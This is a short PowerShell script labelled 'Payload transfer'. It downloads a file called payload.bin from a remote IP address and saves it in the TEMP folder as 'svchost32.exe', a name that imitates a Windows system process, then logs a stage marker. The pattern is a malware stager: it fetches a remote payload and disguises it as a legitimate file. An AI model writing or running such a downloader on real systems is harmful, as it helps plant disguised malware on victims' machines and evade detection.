
# Payload transfer
$RemoteUrl = 'https://198.51.100.78/downloads/payload.bin'
$LocalPath = "$env:TEMP\svchost32.exe"
Invoke-WebRequest -Uri $RemoteUrl -OutFile $LocalPath -UseBasicParsing
Write-Verbose "stage marker 25 reached"
